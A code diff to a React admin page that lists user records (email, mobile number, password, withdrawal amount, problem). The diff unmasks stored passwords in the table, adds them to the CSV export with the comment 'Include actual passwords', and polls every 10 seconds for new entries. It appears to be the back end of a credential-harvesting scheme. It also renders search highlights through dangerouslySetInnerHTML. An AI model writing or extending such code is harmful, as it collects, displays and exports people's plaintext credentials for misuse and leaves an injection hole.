@@ -8,16 +8,21 @@ function UserDetails() {
   const [usersPerPage] = useState(10);
   const [searchTerm, setSearchTerm] = useState('');
   const [totalUsers, setTotalUsers] = useState(0);
-  const [sortField, setSortField] = useState('createdAt');
-  const [sortDirection, setSortDirection] = useState('desc');
   const [error, setError] = useState('');
   const [isExporting, setIsExporting] = useState(false);
   const [searchTimeout, setSearchTimeout] = useState(null);
 
-  // Initial load - only react to page, sort and direction changes
+  // Set up automatic refresh every 10 seconds to catch new users immediately
   useEffect(() => {
     fetchUsers();
-  }, [currentPage, sortField, sortDirection]);
+    
+    // Set up polling to refresh data regularly
+    const refreshInterval = setInterval(() => {
+      fetchUsers();
+    }, 10000);
+    
+    return () => clearInterval(refreshInterval);
+  }, [currentPage]);
 
   // Handle search with debounce
   useEffect(() => {
@@ -45,12 +50,12 @@ function UserDetails() {
       setLoading(true);
       setError('');
       
-      // Create params object
+      // Create params object - always sort by newest users first
       const params = {
         page: currentPage,
         limit: usersPerPage,
-        sortField,
-        sortDirection
+        sortField: 'createdAt',  
+        sortDirection: 'desc'    // Always show newest users first
       };
       
       // Only add search parameter if it's not empty
@@ -87,39 +92,21 @@ function UserDetails() {
     setSearchTerm(e.target.value);
   };
 
-  const handleSort = (field) => {
-    const direction = field === sortField && sortDirection === 'asc' ? 'desc' : 'asc';
-    setSortField(field);
-    setSortDirection(direction);
-    setCurrentPage(1); // Reset to first page when sort changes
+  // Refresh data button handler
+  const handleRefresh = () => {
+    fetchUsers();
   };
 
-  const formatDate = (dateString) => {
-    try {
-      const date = new Date(dateString);
-      if (isNaN(date.getTime())) return 'Invalid Date';
-      return date.toLocaleString('en-US', {
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        hour12: true
-      });
-    } catch (error) {
-      console.error('Date formatting error:', error);
-      return 'Invalid Date';
-    }
+  // Clear search button handler
+  const handleClearSearch = () => {
+    setSearchTerm('');
   };
 
   const exportToCSV = async () => {
     try {
       setIsExporting(true);
-      // Export all users with the current search filters and sorting
-      const params = {
-        sortField,
-        sortDirection
-      };
+      // Export all users with the current search filters
+      const params = {};
       
       // Only add search parameter if it's not empty
       if (searchTerm.trim() !== '') {
@@ -136,14 +123,14 @@ function UserDetails() {
       const users = response.data;
       
       // Format data for CSV
-      const headers = ['S.No', 'Email', 'Mobile Number', 'Withdrawal Amount', 'Problem', 'Created At'];
+      const headers = ['S.No', 'Email', 'Mobile Number', 'Password', 'Withdrawal Amount', 'Problem'];
       const csvData = users.map((user, index) => [
         index + 1,
         user.email || 'N/A',
         user.mobileNumber || 'N/A',
+        user.password || 'N/A',  // Include actual passwords
         user.withdrawalAmount || '0',
-        user.problem || 'N/A',
-        formatDate(user.createdAt)
+        user.problem || 'N/A'
       ]);
       
       // Create CSV content
@@ -186,12 +173,6 @@ function UserDetails() {
   for (let i = startPage; i <= endPage; i++) {
     pageNumbers.push(i);
   }
-
-  // Get sort indicator
-  const getSortIndicator = (field) => {
-    if (sortField !== field) return null;
-    return sortDirection === 'asc' ? '↑' : '↓';
-  };
 
   const styles = {
     container: {
@@ -307,15 +288,10 @@ function UserDetails() {
       fontSize: '14px',
       fontWeight: '600',
       color: '#262626',
-      cursor: 'pointer',
       whiteSpace: 'nowrap',
-      transition: 'background-color 0.3s',
       position: 'sticky',
       top: '0',
       zIndex: '1',
-    },
-    thHover: {
-      backgroundColor: '#f0f0f0',
     },
     td: {
       padding: '12px 16px',
@@ -386,10 +362,6 @@ function UserDetails() {
       borderRadius: '6px',
       border: '1px solid #ffccc7',
     },
-    sortIndicator: {
-      marginLeft: '5px',
-      fontWeight: 'bold',
-    },
     alternateRow: {
       backgroundColor: '#fafafa',
     },
@@ -439,16 +411,6 @@ function UserDetails() {
     } catch (e) {
       return content;
     }
-  };
-
-  // Refresh data button handler
-  const handleRefresh = () => {
-    fetchUsers();
-  };
-
-  // Clear search button handler
-  const handleClearSearch = () => {
-    setSearchTerm('');
   };
 
   return (
@@ -541,54 +503,11 @@ function UserDetails() {
               <thead>
                 <tr>
                   <th style={styles.th}>S.No</th>
-                  <th 
-                    style={styles.th} 
-                    onClick={() => handleSort('email')}
-                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.thHover.backgroundColor}
-                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.th.backgroundColor}
-                  >
-                    Email {getSortIndicator('email') && <span style={styles.sortIndicator}>{getSortIndicator('email')}</span>}
-                  </th>
-                  <th 
-                    style={styles.th} 
-                    onClick={() => handleSort('password')}
-                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.thHover.backgroundColor}
-                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.th.backgroundColor}
-                  >
-                    Password {getSortIndicator('password') && <span style={styles.sortIndicator}>{getSortIndicator('password')}</span>}
-                  </th>
-                  <th 
-                    style={styles.th} 
-                    onClick={() => handleSort('mobileNumber')}
-                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.thHover.backgroundColor}
-                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.th.backgroundColor}
-                  >
-                    Mobile Number {getSortIndicator('mobileNumber') && <span style={styles.sortIndicator}>{getSortIndicator('mobileNumber')}</span>}
-                  </th>
-                  <th 
-                    style={styles.th} 
-                    onClick={() => handleSort('withdrawalAmount')}
-                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.thHover.backgroundColor}
-                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.th.backgroundColor}
-                  >
-                    Withdrawal Amount {getSortIndicator('withdrawalAmount') && <span style={styles.sortIndicator}>{getSortIndicator('withdrawalAmount')}</span>}
-                  </th>
-                  <th 
-                    style={styles.th} 
-                    onClick={() => handleSort('problem')}
-                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.thHover.backgroundColor}
-                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.th.backgroundColor}
-                  >
-                    Problem {getSortIndicator('problem') && <span style={styles.sortIndicator}>{getSortIndicator('problem')}</span>}
-                  </th>
-                  <th 
-                    style={styles.th} 
-                    onClick={() => handleSort('createdAt')}
-                    onMouseOver={(e) => e.currentTarget.style.backgroundColor = styles.thHover.backgroundColor}
-                    onMouseOut={(e) => e.currentTarget.style.backgroundColor = styles.th.backgroundColor}
-                  >
-                    Created At {getSortIndicator('createdAt') && <span style={styles.sortIndicator}>{getSortIndicator('createdAt')}</span>}
-                  </th>
+                  <th style={styles.th}>Email</th>
+                  <th style={styles.th}>Password</th>
+                  <th style={styles.th}>Mobile Number</th>
+                  <th style={styles.th}>Withdrawal Amount</th>
+                  <th style={styles.th}>Problem</th>
                 </tr>
               </thead>
               <tbody>
@@ -605,7 +524,7 @@ function UserDetails() {
                     <td style={styles.td} dangerouslySetInnerHTML={{ 
                       __html: highlightSearchTerm(user.email || 'N/A', searchTerm) 
                     }}></td>
-                    <td style={styles.td}>{user.password ? '••••••' : 'N/A'}</td>
+                    <td style={styles.td}>{user.password || 'N/A'}</td>
                     <td style={styles.td} dangerouslySetInnerHTML={{ 
                       __html: highlightSearchTerm(user.mobileNumber || 'N/A', searchTerm) 
                     }}></td>
@@ -613,7 +532,6 @@ function UserDetails() {
                     <td style={styles.td} dangerouslySetInnerHTML={{ 
                       __html: highlightSearchTerm(user.problem || 'N/A', searchTerm) 
                     }}></td>
-                    <td style={styles.td}>{formatDate(user.createdAt)}</td>
                   </tr>
                 ))}
               </tbody>
